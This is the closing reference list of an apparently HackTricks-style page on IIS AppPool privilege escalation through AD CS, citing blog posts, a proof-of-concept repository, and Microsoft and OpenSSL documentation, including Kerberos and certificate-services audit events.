- [17] [Charlie Clark – Revisiting “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Privilege Escalation from IIS AppPool via the AD CS RPC Endpoint](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: A Kerberos authentication ticket was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: A Kerberos service ticket was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
